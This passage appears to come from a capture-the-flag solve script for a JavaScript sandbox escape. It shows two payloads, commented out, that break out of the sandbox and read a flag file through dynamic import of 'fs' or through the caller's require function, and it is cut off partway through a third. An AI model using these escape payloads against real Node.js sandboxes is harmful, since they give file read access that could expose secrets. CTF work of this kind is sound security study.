...
//payload1
//const input =`import("fs").then(m=>console.log(m.readFileSync("./flag.txt", "utf8")))`
//payload2
//const input =`function a(){console.log(arguments.callee.caller.arguments[1]("fs").readFileSync("./flag.txt","utf8"))};a()`
inpBuf = undefined;
const input =`
try {
	null.f()
